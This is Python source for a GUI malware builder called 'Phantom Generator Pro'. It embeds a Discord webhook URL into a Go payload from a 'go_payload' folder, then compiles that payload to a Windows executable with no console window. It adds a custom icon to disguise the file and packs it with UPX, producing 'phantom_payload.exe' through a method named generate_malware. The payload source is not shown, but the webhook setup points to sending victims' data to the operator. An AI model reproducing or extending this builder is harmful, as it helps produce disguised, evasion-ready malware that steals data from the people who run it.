import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import os
import subprocess
import sys
from resource_injector import inject_icon

class Phantom:
    def __init__(self, root):
        self.root = root
        self.root.title("Phantom Generator Pro")
        self.root.geometry("550x500")
        self.root.configure(bg="#1a1a1a")
        self.root.resizable(False, False)
        
        # Style
        style = ttk.Style()
        style.theme_use('clam')
        
        # Colors
        BG_COLOR = "#1a1a1a"
        ACCENT_COLOR = "#3498db"
        TEXT_COLOR = "#ecf0f1"
        SECONDARY_BG = "#2c3e50"

        style.configure("TFrame", background=BG_COLOR)
        style.configure("TLabel", background=BG_COLOR, foreground=TEXT_COLOR, font=("Segoe UI", 10))
        style.configure("TButton", font=("Segoe UI", 10, "bold"))
        style.configure("Header.TLabel", font=("Segoe UI", 20, "bold"), foreground=ACCENT_COLOR)
        style.configure("Status.TLabel", font=("Segoe UI", 9, "italic"), foreground="#95a5a6")
        style.configure("Horizontal.TProgressbar", thickness=10)

        # Initialize attributes
        self.destination = None
        self.icon_path = None
        self.go_executable = self._find_go_executable()

        # Main Container
        main_frame = ttk.Frame(root, padding="30")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Header
        header = ttk.Label(main_frame, text="PHANTOM GENERATOR", style="Header.TLabel")
        header.pack(pady=(0, 25))

        # Webhook URL
        ttk.Label(main_frame, text="Discord Webhook URL:").pack(anchor=tk.W)
        self.url_entry = ttk.Entry(main_frame, width=60)
        self.url_entry.pack(fill=tk.X, pady=(5, 15))

        # EXE Name
        ttk.Label(main_frame, text="Output EXE Name:").pack(anchor=tk.W)
        self.exe_entry = ttk.Entry(main_frame, width=60)
        self.exe_entry.insert(0, "phantom_payload.exe")
        self.exe_entry.pack(fill=tk.X, pady=(5, 15))

        # Buttons Frame
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill=tk.X, pady=10)

        self.destination_button = ttk.Button(btn_frame, text="📁 Select Folder", command=self.select_destination)
        self.destination_button.pack(side=tk.LEFT, padx=(0, 10), expand=True, fill=tk.X)

        self.icon_button = ttk.Button(btn_frame, text="🖼️ Select Icon", command=self.select_icon)
        self.icon_button.pack(side=tk.LEFT, expand=True, fill=tk.X)

        # Status Labels
        info_frame = ttk.Frame(main_frame)
        info_frame.pack(fill=tk.X, pady=10)

        self.dest_label = ttk.Label(info_frame, text="📍 No folder selected", font=("Segoe UI", 8), foreground="#bdc3c7")
        self.dest_label.pack(anchor=tk.W)
        
        self.icon_label = ttk.Label(info_frame, text="🖼️ No icon selected", font=("Segoe UI", 8), foreground="#bdc3c7")
        self.icon_label.pack(anchor=tk.W)

        # Generate Button
        self.generate_button = ttk.Button(main_frame, text="⚡ GENERATE PAYLOAD", command=self.generate_malware)
        self.generate_button.pack(fill=tk.X, pady=(20, 10))

        # Progress
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(main_frame, variable=self.progress_var, maximum=100, style="Horizontal.TProgressbar")
        self.progress_bar.pack(fill=tk.X, pady=(10, 5))
        
        self.status_label = ttk.Label(main_frame, text="Ready", style="Status.TLabel")
        self.status_label.pack()
    
    def _find_go_executable(self):
        """Find the Go executable in the system"""
        # 1. Try common locations
        possible_paths = [
            os.path.join(os.environ.get("ProgramFiles", "C:\\Program Files"), "Go", "bin", "go.exe"),
            "C:\\go\\bin\\go.exe",
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                return path
        
        # 2. Try from PATH using 'where' or 'which'
        try:
            cmd = "where" if os.name == "nt" else "which"
            result = subprocess.run([cmd, "go"], capture_output=True, text=True, check=True)
            return result.stdout.strip().split('\n')[0]
        except:
            return None

    def select_destination(self):
        self.destination = filedialog.askdirectory()
        if self.destination:
            self.dest_label.config(text=f"📍 {os.path.abspath(self.destination)}")

    def select_icon(self):
        self.icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
        if self.icon_path:
            self.icon_label.config(text=f"🖼️ {os.path.basename(self.icon_path)}")

    def generate_malware(self):
        url = self.url_entry.get().strip()
        exe_name = self.exe_entry.get().strip()
        
        if not url:
            messagebox.showwarning("Warning", "Please enter a Webhook URL")
            return
        if not self.destination:
            messagebox.showwarning("Warning", "Please select a destination folder")
            return
        
        if not self.go_executable:
            messagebox.showerror("Error", "Go (Golang) not found on your system.\nPlease install it from https://go.dev/")
            return
        
        if not exe_name.endswith('.exe'):
            exe_name += '.exe'
        
        try:
            self.generate_button.config(state=tk.DISABLED)
            self.status_label.config(text="Initializing...")
            self.progress_var.set(5)
            self.root.update()
            
            script_dir = os.path.dirname(os.path.abspath(__file__))
            go_payload_dir = os.path.join(script_dir, "go_payload")
            output_exe = os.path.join(self.destination, exe_name)
            
            if not os.path.exists(os.path.join(go_payload_dir, "main.go")):
                messagebox.showerror("Error", "Source files missing in 'go_payload' directory")
                return
            
            self.status_label.config(text="Preparing build environment...")
            self.progress_var.set(20)
            self.root.update()
            
            # Compile Go code
            timestamp = str(__import__('datetime').datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            # ldflags: -s -w (reduce size), -H=windowsgui (no console window)
            ldflags = f"-s -w -H=windowsgui -X main.WebhookURL={url} -X \"main.Timestamp={timestamp}\""
            
            self.status_label.config(text="Compiling binary (Go)...")
            self.progress_var.set(40)
            self.root.update()

            build_cmd = [
                self.go_executable, "build",
                "-o", output_exe,
                "-ldflags", ldflags,
                "main.go"
            ]
            
            result = subprocess.run(build_cmd, check=True, cwd=go_payload_dir, 
                                 capture_output=True, text=True)
            
            # Inject icon
            if self.icon_path:
                self.status_label.config(text="Injecting custom icon...")
                self.progress_var.set(70)
                self.root.update()
                if not inject_icon(output_exe, self.icon_path):
                    print("Warning: Icon injection failed")
            
            # UPX Compression
            self.status_label.config(text="Applying UPX compression...")
            self.progress_var.set(85)
            self.root.update()
            
            try:
                subprocess.run(["upx", "--best", output_exe], check=False, capture_output=True)
            except:
                pass # UPX not installed
            
            self.status_label.config(text="Payload ready!")
            self.progress_var.set(100)
            self.root.update()
            
            messagebox.showinfo("Success", f"Payload generated successfully!\n\nLocation: {output_exe}")
            
        except subprocess.CalledProcessError as e:
            error_msg = e.stderr if e.stderr else str(e)
            messagebox.showerror("Build Error", f"Compilation failed:\n{error_msg}")
        except Exception as e:
            messagebox.showerror("Error", f"An unexpected error occurred:\n{str(e)}")
        finally:
            self.generate_button.config(state=tk.NORMAL)
            self.status_label.config(text="Ready")
            self.progress_var.set(0)

if __name__ == "__main__":
    root = tk.Tk()
    app = Phantom(root)
    root.mainloop()
